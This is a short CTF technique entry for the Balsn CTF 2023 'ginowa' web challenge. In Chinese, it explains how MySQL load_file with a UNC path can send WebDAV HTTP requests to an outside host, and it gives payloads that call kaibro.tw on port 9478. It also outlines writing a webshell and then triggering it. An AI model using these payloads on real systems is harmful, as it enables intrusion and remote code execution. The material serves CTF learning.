---
title: "Balsn CTF 2023 - ginowa"
description: "load_file with WebDAV

load_file('//kaibro.tw@9478/meow.php') / load_file('\\\\kaibro.tw@9478/meow.php')

Windows 環境有開 WebClient Service 時，可以透過 MySQL load_file + UNC Path 發送 HTTP Reuqest 到指定 URL (透過 @ 指定 Port)
實戰中，站庫分離環境，若後端 MySQL 主機有開 Web 環境，則可透過該方法先寫 webshell 再送 http request 觸發執行


Example





"
external_url: "https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2023#ginowa"
category: "Web Exploitation"
---
